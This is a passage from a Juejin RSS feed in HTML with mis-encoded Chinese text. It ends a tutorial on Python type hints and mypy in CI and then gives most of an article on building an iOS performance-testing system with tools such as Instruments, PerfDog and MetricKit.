<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> a + b
</code></pre>
<h3 data-id="heading-26">ç¬¬ä¸‰æ­¥ï¼šé…ç½®CI/CD</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actionsç¤ºä¾‹</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">types</span> <span class="hljs-string">with</span> <span class="hljs-string">mypy</span>
  <span class="hljs-attr">run:</span> <span class="hljs-string">|
    python -m pip install mypy
    mypy src/
</span></code></pre>
<h2 data-id="heading-27">æ€»ç»“ï¼šä¸ºä»€ä¹ˆä½ åº”è¯¥ç”¨ç±»å‹æ³¨è§£+mypy</h2>
<p>è®°ä½ä¸€å¥è¯ï¼š<strong>ç±»å‹æ³¨è§£æ˜¯ç»™æœªæ¥çš„è‡ªå·±å’ŒåŒäº‹æœ€å¥½çš„ç¤¼ç‰©ã€‚</strong></p>
<ol>
<li><strong>æå‰å‘ç°bug</strong>ï¼šè¿è¡Œå‰å°±å‘ç°ç±»å‹é”™è¯¯</li>
<li><strong>ä»£ç æ›´æ¸…æ™°</strong>ï¼šä¸€çœ‹å°±çŸ¥é“å‡½æ•°æœŸæœ›ä»€ä¹ˆç±»å‹</li>
<li><strong>é‡æ„æ›´å®‰å…¨</strong>ï¼šæ”¹ä»£ç æ—¶myPyå¸®ä½ æ£€æŸ¥</li>
<li><strong>IDEæ›´æ™ºèƒ½</strong>ï¼šæ›´å¥½çš„è‡ªåŠ¨è¡¥å…¨å’Œé”™è¯¯æç¤º</li>
<li><strong>å›¢é˜Ÿåä½œæ›´é¡ºç•…</strong>ï¼šå‡å°‘æ²Ÿé€šæˆæœ¬</li>
</ol>
<p>ä¸‹æ¬¡å†å†™Pythonä»£ç æ—¶ï¼Œåˆ«å†è£¸å¥”äº†ã€‚èŠ±å‡ ç§’é’ŸåŠ ä¸Šç±»å‹æ³¨è§£ï¼Œè¿è¡Œä¸€æ¬¡mypyæ£€æŸ¥ï¼Œä½ çš„ä»£ç ä¼šæ„Ÿè°¢ä½ çš„ï¼</p>
<hr/>
<p><strong>å»¶ä¼¸é˜…è¯»ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmypy.readthedocs.io%2F" target="_blank" title="https://mypy.readthedocs.io/" ref="nofollow noopener noreferrer">mypyå®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.python.org%2Fdev%2Fpeps%2Fpep-0484%2F" target="_blank" title="https://www.python.org/dev/peps/pep-0484/" ref="nofollow noopener noreferrer">Pythonç±»å‹æ³¨è§£PEP 484</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Ftyping.html%23typing.TypedDict" target="_blank" title="https://docs.python.org/3/library/typing.html#typing.TypedDict" ref="nofollow noopener noreferrer">TypedDictä½¿ç”¨æŒ‡å—</a></li>
</ul>
<p><strong>ä½ åœ¨é¡¹ç›®ä¸­ç”¨ç±»å‹æ³¨è§£å—ï¼Ÿé‡åˆ°äº†ä»€ä¹ˆå‘ï¼Ÿè¯„è®ºåŒºèŠèŠï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ›´éªšçš„æ“ä½œï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºå¯è½åœ°çš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»ï¼Œä»åœºæ™¯æ‹†è§£åˆ°å¤šå·¥å…·ååŒçš„å·¥ç¨‹åŒ–å®è·µ]]></title>    <link>https://juejin.cn/post/7581025279645810726</link>    <guid>https://juejin.cn/post/7581025279645810726</guid>    <pubDate>2025-12-08T06:02:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581025279645810726" data-draft-id="7580745065171386419" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºå¯è½åœ°çš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»ï¼Œä»åœºæ™¯æ‹†è§£åˆ°å¤šå·¥å…·ååŒçš„å·¥ç¨‹åŒ–å®è·µ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T06:02:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒçŒ´çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºå¯è½åœ°çš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»ï¼Œä»åœºæ™¯æ‹†è§£åˆ°å¤šå·¥å…·ååŒçš„å·¥ç¨‹åŒ–å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒçŒ´çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:02:44.000Z" title="Mon Dec 08 2025 06:02:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å½“å‰çš„ç§»åŠ¨åº”ç”¨ç ”å‘ä½“ç³»ä¸­ï¼Œ<strong>iOS æ€§èƒ½æµ‹è¯•</strong> å·²æˆä¸ºè´¨é‡ä¿è¯ä¸­æœ€å¤æ‚å´ä¹Ÿæœ€å…³é”®çš„ä¸€ç¯ã€‚
éšç€ App åŠŸèƒ½ä¸æ–­æ‰©å¼ ã€ç•Œé¢å¤æ‚åº¦æå‡ã€è·¨ç«¯æŠ€æœ¯èå…¥ï¼ˆFlutterã€uni-appã€WebViewã€RNã€æ¸¸æˆå¼•æ“ç­‰ï¼‰ï¼Œæ€§èƒ½é—®é¢˜å·²ç»ä¸å†å±€é™äºâ€œå¡ä¸å¡â€â€œå¿«ä¸å¿«â€ï¼Œè€Œæ˜¯æ¶‰åŠ CPUã€GPUã€å†…å­˜ã€I/Oã€ç½‘ç»œã€ç³»ç»Ÿè¡Œä¸ºã€Hybrid è¿è¡Œæœºåˆ¶ç­‰å¤šä¸ªç»´åº¦ã€‚</p>
<p>å› æ­¤ï¼Œé«˜è´¨é‡çš„ iOS æ€§èƒ½æµ‹è¯•å¿…é¡»ä¾èµ– <strong>å¤šå·¥å…·ååŒ</strong>ï¼Œæ„å»ºä¸€ä¸ªå…·å¤‡å¯è§‚æµ‹ã€å¯å›æº¯ã€å¯é‡åŒ–ã€å¯å¤ç°èƒ½åŠ›çš„å·¥ç¨‹ä½“ç³»ï¼Œè€Œéç”¨æŸä¸€ä¸ªæµ‹è¯•å·¥å…·ç®€å•æµ‹é‡ FPS æˆ– CPU å°±ç»“æŸã€‚</p>
<p>æœ¬æ–‡åŸºäºå·¥ç¨‹ç»éªŒï¼Œå°† Instrumentsã€å…‹é­”ï¼ˆKeyMobï¼‰ã€PerfDogã€Safari Inspectorã€Charlesã€MetricKitã€Crashlyticsã€Xcode è°ƒè¯•å·¥å…·è”åˆèµ·æ¥ï¼Œæ„å»ºä¸€å¥—çœŸæ­£å¯è½åœ°çš„æ€§èƒ½æµ‹è¯•æ–¹æ³•è®ºã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€æ€§èƒ½æµ‹è¯•ä¸ºä½•ä¸èƒ½åªæµ‹ FPSï¼Ÿ</h2>
<p>è®¸å¤šå›¢é˜Ÿæœ€åˆåšæ€§èƒ½æµ‹è¯•æ—¶ä¼šçŠ¯ä¸€ä¸ªå¸¸è§è¯¯åŒºï¼š
<strong>åªå…³æ³¨æµç•…åº¦ï¼Œè€Œå¿½ç•¥ CPUã€å†…å­˜ã€ç½‘ç»œã€ç³»ç»Ÿè¡Œä¸ºç­‰ä¿¡æ¯ã€‚</strong></p>
<p>ä½†æ€§èƒ½é—®é¢˜çš„æœ¬è´¨æ˜¯â€œå¤šç»´äº¤äº’æ•ˆåº”â€ï¼š</p>
<h3 data-id="heading-1"><strong>1. UI å¡é¡¿å¯èƒ½ä¸æ˜¯ GPU é—®é¢˜ï¼Œè€Œæ˜¯ CPU æ­£åœ¨è§£æå¤§é‡ JSON</strong></h3>
<h3 data-id="heading-2"><strong>2. é¡µé¢åŠ è½½æ…¢å¯èƒ½ä¸æ˜¯ç½‘ç»œé—®é¢˜ï¼Œè€Œæ˜¯ WebView DOM è¿‡å¤§å¡ä½æ¸²æŸ“çº¿ç¨‹</strong></h3>
<h3 data-id="heading-3"><strong>3. å†…å­˜ä¸Šæ¶¨å¯èƒ½ä¸æ˜¯æ³„æ¼ï¼Œè€Œæ˜¯å›¾ç‰‡ç¼“å­˜ç­–ç•¥ä¸åˆç†å¯¼è‡´ï¼Œä»¥åŠåå°ä»»åŠ¡ç•™å­˜</strong></h3>
<h3 data-id="heading-4"><strong>4. å‘çƒ­å¯èƒ½ä¸æ˜¯æ¸²æŸ“å‹åŠ›ï¼Œè€Œæ˜¯æŸäº›é¢‘ç¹è°ƒåº¦çš„ Timer é€ æˆ CPU æŒç»­æ´»è·ƒ</strong></h3>
<p>å› æ­¤æ€§èƒ½æµ‹è¯•å¿…é¡»å…·å¤‡è·¨å±‚çº§è§‚å¯Ÿèƒ½åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-5">äºŒã€iOS æ€§èƒ½æµ‹è¯•çš„æ ¸å¿ƒç»´åº¦ï¼ˆå¿…é¡»å…¨è¦†ç›–ï¼‰</h2>
<h3 data-id="heading-6"><strong>1. CPU</strong></h3>
<ul>
<li>è®¡ç®—å‹åŠ›</li>
<li>ä¸»çº¿ç¨‹é˜»å¡</li>
<li>JSONã€å¤§å¾ªç¯ã€å¸ƒå±€è®¡ç®—</li>
</ul>
<h3 data-id="heading-7"><strong>2. GPU</strong></h3>
<ul>
<li>ç¦»å±æ¸²æŸ“</li>
<li>åŠ¨ç”»åˆ·æ–°é¢‘ç‡</li>
<li>åˆ—è¡¨å¿«é€Ÿæ»šåŠ¨</li>
</ul>
<h3 data-id="heading-8"><strong>3. å†…å­˜</strong></h3>
<ul>
<li>æ³„æ¼ï¼ˆæ³„æ¼å¯¼è‡´é•¿æœŸæ¶¨ï¼‰</li>
<li>é«˜å³°å€¼</li>
<li>WebView å†…å­˜è†¨èƒ€</li>
<li>å¯¹è±¡æœªé‡Šæ”¾</li>
</ul>
<h3 data-id="heading-9"><strong>4. ç½‘ç»œ</strong></h3>
<ul>
<li>å“åº”è€—æ—¶</li>
<li>èµ„æºå¤§å°</li>
<li>å¼±ç½‘ä¸‹è¡Œä¸º</li>
</ul>
<h3 data-id="heading-10"><strong>5. Web / Hybrid</strong></h3>
<ul>
<li>JS é•¿ä»»åŠ¡</li>
<li>DOM é‡ç»˜</li>
<li>èµ„æºåŠ è½½é€»è¾‘</li>
</ul>
<h3 data-id="heading-11"><strong>6. ç³»ç»Ÿè¡Œä¸º</strong></h3>
<ul>
<li>thermal é™é¢‘</li>
<li>jetsamï¼ˆå†…å­˜æ€ï¼‰</li>
<li>watchdogï¼ˆå¡æ­»æ€ï¼‰</li>
</ul>
<p>ä»»ä½•ä¸€ä¸ªç»´åº¦å¤±æ§éƒ½ä¼šé€ æˆâ€œæ€§èƒ½é—®é¢˜â€ã€‚</p>
<hr/>
<h2 data-id="heading-12">ä¸‰ã€Instrumentsï¼šåº•å±‚æ€§èƒ½åˆ†æçš„æ——èˆ°å·¥å…·</h2>
<p>Instruments æ˜¯æ•´ä¸ªæ€§èƒ½æµ‹è¯•ä½“ç³»ä¸­å¿…é¡»æŒæ¡çš„ä¸€ç¯ã€‚</p>
<h3 data-id="heading-13"><strong>1. Time Profiler â†’ CPU æ·±åº¦åˆ†æ</strong></h3>
<p>ç”¨äºï¼š</p>
<ul>
<li>å®šä½çƒ­ç‚¹å‡½æ•°</li>
<li>æŸ¥æ‰¾é˜»å¡è°ƒç”¨</li>
<li>åˆ†æä¸»çº¿ç¨‹æ‰§è¡Œæ—¶é—´</li>
</ul>
<p>éå¸¸é€‚åˆé¡µé¢åŠ è½½æ…¢ã€äº¤äº’å»¶è¿Ÿç±»é—®é¢˜ã€‚</p>
<h3 data-id="heading-14"><strong>2. Core Animation â†’ GPU &amp; æ¸²æŸ“åˆ†æ</strong></h3>
<p>å¯ä»¥æ£€æµ‹ï¼š</p>
<ul>
<li>æ‰å¸§åŸå› </li>
<li>ç¦»å±æ¸²æŸ“</li>
<li>è§†å›¾å±‚çº§è¿‡æ·±</li>
</ul>
<p>å¸¸ç”¨äºåˆ—è¡¨æ€§èƒ½ã€åŠ¨ç”»æ€§èƒ½æµ‹è¯•ã€‚</p>
<h3 data-id="heading-15"><strong>3. Allocations / Leaks â†’ å†…å­˜å ç”¨ä¸æ³„æ¼æ£€æµ‹</strong></h3>
<p>å¯è¯†åˆ«ï¼š</p>
<ul>
<li>æœªé‡Šæ”¾çš„å¯¹è±¡</li>
<li>WebView / å›¾ç‰‡å ç”¨</li>
<li>å¯¹è±¡åå¤åˆ›å»º</li>
</ul>
<p>Instruments è´Ÿè´£â€œæ·±åº¦æ£€ä¿®å±‚é¢â€çš„æ€§èƒ½è¯Šæ–­ã€‚</p>
<hr/>
<h2 data-id="heading-16">å››ã€å…‹é­”ï¼ˆKeyMobï¼‰ï¼šçœŸæœºæ€§èƒ½ç›‘æ§ + ç³»ç»Ÿæ—¥å¿—è¡¥å…¨</h2>
<p>æ€§èƒ½é—®é¢˜å¾ˆå¤šéƒ½åªæœ‰åœ¨çœŸæœºã€å¤šåœºæ™¯ã€é•¿æ—¶é—´è¿è¡Œä¸‹æ‰ä¼šæš´éœ²ï¼Œå› æ­¤ KeyMob åœ¨æ€§èƒ½ä½“ç³»ä¸­æ‰¿æ‹…â€œè¡Œä¸ºè§‚æµ‹å™¨â€çš„ä½œç”¨ã€‚</p>
<h3 data-id="heading-17"><strong>1. çœŸæœºå®æ—¶ç›‘æ§ï¼ˆé•¿æ—¶é—´æ€§èƒ½æµ‹è¯•ï¼‰</strong></h3>
<p>åŒ…æ‹¬ï¼š</p>
<ul>
<li>CPUï¼ˆå«ä¸»çº¿ç¨‹ï¼‰</li>
<li>GPU</li>
<li>FPS</li>
<li>å†…å­˜è¶‹åŠ¿</li>
<li>ç½‘ç»œåå</li>
<li>æ¸©åº¦ã€ç”µé‡å˜åŒ–</li>
</ul>
<p>é€‚ç”¨äºï¼š</p>
<ul>
<li>é•¿æ—¶é—´å‹æµ‹</li>
<li>é«˜é¢‘äº¤äº’é¡µé¢</li>
<li>å¯¹æ¯”ä¸åŒç‰ˆæœ¬æ€§èƒ½å˜åŒ–</li>
</ul>
<h3 data-id="heading-18"><strong>2. ç³»ç»Ÿæ—¥å¿—æ˜¯å®šä½éšè—æ€§èƒ½é—®é¢˜çš„å…³é”®</strong></h3>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">jetsam: memory pressure high</span>
<span class="hljs-section">watchdog: main thread blocked</span>
<span class="hljs-section">thermal: CPU frequency reduced</span>
WebKit process terminated
</code></pre>
<p>è¿™äº›ä¿¡æ¯å¾€å¾€æ­ç¤ºâ€œä¸ºä»€ä¹ˆæ€§èƒ½æŒç»­æ¶åŒ–â€ã€‚</p>
<h3 data-id="heading-19"><strong>3. æ–‡ä»¶ç³»ç»Ÿåˆ†æ</strong></h3>
<p>ç”¨äºï¼š</p>
<ul>
<li>æ£€æŸ¥ç¼“å­˜æ–‡ä»¶æ˜¯å¦å¼‚å¸¸å¢é•¿</li>
<li>WebView ç¼“å†²æ˜¯å¦è†¨èƒ€</li>
<li>æ•°æ®åº“æ–‡ä»¶è¿‡å¤§å¯¼è‡´å¯åŠ¨æ…¢</li>
</ul>
<p>è¿™äº›ä¹Ÿæ˜¯æ€§èƒ½æµ‹è¯•çš„ä¸€éƒ¨åˆ†ã€‚</p>
<hr/>
<h2 data-id="heading-20">äº”ã€PerfDogï¼šæ¸²æŸ“æ€§èƒ½ä¸é«˜äº¤äº’åœºæ™¯çš„ä¸“ä¸šå·¥å…·</h2>
<p>PerfDog åœ¨æµ‹è¯•é«˜äº¤äº’ã€é«˜åŠ¨ç”»åœºæ™¯æ—¶éå¸¸é«˜æ•ˆã€‚</p>
<h3 data-id="heading-21">èƒ½ç›‘æ§ï¼š</h3>
<ul>
<li>FPS æ•´ä½“è¶‹åŠ¿</li>
<li>æ‰å¸§ç‚¹åˆ†å¸ƒ</li>
<li>CPU/GPU æ›²çº¿</li>
<li>å†…å­˜åŠ¨æ€å˜åŒ–</li>
<li>å‘çƒ­æƒ…å†µ</li>
</ul>
<p>é€‚ç”¨äºï¼š</p>
<ul>
<li>é•¿åˆ—è¡¨</li>
<li>åŠ¨ç”»å¯†é›†é¡µé¢</li>
<li>Flutter / Unity / RN</li>
<li>è§†é¢‘æ’­æ”¾åœºæ™¯</li>
</ul>
<p>å¦‚æœ UI å¡é¡¿ï¼Œæ˜¯ CPUã€GPU è¿˜æ˜¯çº¿ç¨‹è°ƒåº¦é—®é¢˜ï¼ŒPerfDog çš„æ›²çº¿èƒ½ä¸€çœ¼çœ‹å‡ºæ¥ã€‚</p>
<hr/>
<h2 data-id="heading-22">å…­ã€Safari Inspectorï¼šWebView æ€§èƒ½æµ‹è¯•çš„å”¯ä¸€å¯é å·¥å…·</h2>
<p>Hybrid é¡µé¢æ€§èƒ½é—®é¢˜å¾€å¾€æ¥æºäºï¼š</p>
<ul>
<li>DOM å¤§å°</li>
<li>JS é•¿ä»»åŠ¡</li>
<li>JSBridge é¢‘ç¹è°ƒç”¨</li>
<li>WebKit è¿›ç¨‹å†…å­˜å ç”¨</li>
<li>H5 å›¾ç‰‡èµ„æºè¿‡å¤§</li>
</ul>
<p>Safari Inspector å¯æ£€æµ‹ï¼š</p>
<ul>
<li>JS æ‰§è¡Œæ—¶é—´æŸ±çŠ¶å›¾</li>
<li>DOM ä¿®æ”¹æ¬¡æ•°</li>
<li>ç½‘ç»œèµ„æºåŠ è½½æ—¶é—´</li>
<li>WebKit ç³»ç»ŸæŠ¥é”™</li>
</ul>
<p>é€‚ç”¨äº uni-appã€å°ç¨‹åº SDKã€Hybrid é¦–é¡µã€æ´»åŠ¨é¡µç­‰ã€‚</p>
<hr/>
<h2 data-id="heading-23">ä¸ƒã€Charlesï¼šç½‘ç»œæ€§èƒ½æµ‹è¯•çš„å¿…å¤‡ç¯èŠ‚</h2>
<p>ç½‘ç»œé—®é¢˜å¸¸å¸¸ä¼ªè£…æˆæ€§èƒ½é—®é¢˜ã€‚</p>
<p>Charles å¯ç”¨äºï¼š</p>
<ul>
<li>æŠ“åŒ…åˆ†æå“åº”è€—æ—¶</li>
<li>æ£€æŸ¥æ¥å£æ˜¯å¦è¿‡å¤š</li>
<li>å¼±ç½‘æ¨¡æ‹ŸéªŒè¯ç”¨æˆ·ä½“éªŒ</li>
<li>æ£€æŸ¥èµ„æºç¼“å­˜ç­–ç•¥</li>
<li>æ£€æŸ¥æ˜¯å¦å­˜åœ¨é‡å¤è¯·æ±‚</li>
</ul>
<p>é¦–å±æ…¢ã€åŠ è½½ç¼“æ…¢ã€ç™½å±ç­‰é—®é¢˜å¾€å¾€æºäºç½‘ç»œå±‚ï¼Œè€Œä¸æ˜¯æ¸²æŸ“å±‚ã€‚</p>
<hr/>
<h2 data-id="heading-24">å…«ã€MetricKitï¼šä¸Šçº¿æ€§èƒ½è¶‹åŠ¿çš„çœŸå®æ•°æ®æ¥æº</h2>
<p>MetricKit æä¾›ç³»ç»Ÿçº§æ€§èƒ½è¯Šæ–­ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯åŠ¨æ—¶é—´</li>
<li>å¡é¡¿è¯Šæ–­ï¼ˆhangï¼‰</li>
<li>CPU å³°å€¼</li>
<li>å†…å­˜å³°å€¼</li>
<li>WebKit å´©æºƒ</li>
<li>jetsam / watchdog</li>
<li>I/O è€—æ—¶</li>
</ul>
<p>é€‚ç”¨äºéªŒè¯æ¯ä¸ªç‰ˆæœ¬çš„æ€§èƒ½æ˜¯å¦é€€åŒ–ã€‚</p>
<hr/>
<h2 data-id="heading-25">ä¹ã€Crashlyticsï¼šå¸®åŠ©åˆ†æâ€œæ€§èƒ½å¯¼è‡´çš„å´©æºƒâ€</h2>
<p>Crashlytics ä¸æ˜¯æ€§èƒ½å·¥å…·ï¼Œä½†å…¶æ•°æ®è¡¥å……æä¸ºé‡è¦ï¼š</p>
<ul>
<li>ä¸»çº¿ç¨‹å¡ä½</li>
<li>çº¿ç¨‹æ± è¿‡å¤š</li>
<li>WebView å¼‚å¸¸</li>
<li>èµ„æºåŠ è½½å¤±è´¥</li>
<li>åå°çº¿ç¨‹æœªé‡Šæ”¾</li>
</ul>
<p>è¿™äº›å¼‚å¸¸ç»å¸¸æç¤ºâ€œæ€§èƒ½å·²ç»æ¶åŒ–åˆ°å½±å“ç¨³å®šæ€§â€ã€‚</p>
<hr/>
<h2 data-id="heading-26">åã€æ„å»ºå¤šå·¥å…·ååŒçš„ iOS æ€§èƒ½æµ‹è¯•çŸ©é˜µ</h2>













































<table><thead><tr><th>åœºæ™¯</th><th>å·¥å…·ç»„åˆ</th><th>èƒ½è§£å†³çš„é—®é¢˜</th></tr></thead><tbody><tr><td>é¡µé¢åŠ è½½æ…¢</td><td>Instruments + Charles</td><td>CPU çƒ­ç‚¹ã€ç½‘ç»œé“¾è·¯</td></tr><tr><td>åŠ¨ç”»å¡é¡¿</td><td>Core Animation + PerfDog</td><td>GPUã€ç¦»å±æ¸²æŸ“</td></tr><tr><td>å†…å­˜æ¶¨</td><td>Allocations + KeyMob</td><td>æ³„æ¼ã€ç¼“å­˜è†¨èƒ€</td></tr><tr><td>Hybrid å¡é¡¿</td><td>Safari Inspector + KeyMob</td><td>JSã€DOMã€èµ„æº</td></tr><tr><td>è§†é¢‘/å¤šåª’ä½“</td><td>PerfDog + KeyMob</td><td>CPU/GPU å³°å€¼ã€å†…å­˜å³°å€¼</td></tr><tr><td>å¼±ç½‘æ€§èƒ½</td><td>Charles + KeyMob</td><td>è¶…æ—¶ã€é‡è¯•ã€æµæ§</td></tr><tr><td>ç¨³å®šæ€§æ€§èƒ½</td><td>KeyMob + MetricKit</td><td>ç³»ç»Ÿè¡Œä¸ºã€æ¸©åº¦ã€jetsam</td></tr></tbody></table>
<p>è¿™ä¸ªçŸ©é˜µè¦†ç›–æ—¥å¸¸ç»å¤§å¤šæ•°æ€§èƒ½é—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-27">æ€§èƒ½æµ‹è¯•æ˜¯å·¥ç¨‹èƒ½åŠ›ï¼Œè€Œä¸æ˜¯å·¥å…·èƒ½åŠ›</h2>
<p>æˆç†Ÿçš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»åº”è¯¥å…·å¤‡ï¼š</p>
<p><strong>å¯è§‚æµ‹ â†’ å¯é‡åŒ– â†’ å¯å®šä½ â†’ å¯å¤ç° â†’ å¯å›å½’ â†’ å¯ç›‘æ§</strong></p>
<p>è¿™ä¸€ä½“ç³»ä¾èµ–å¤šå·¥å…·ååŒï¼š</p>
<ul>
<li><strong>Instruments</strong>ï¼šæ·±åº¦è¯Šæ–­</li>
<li><strong>KeyMob</strong>ï¼šçœŸæœºç›‘æ§ä¸ç³»ç»Ÿæ—¥å¿—</li>
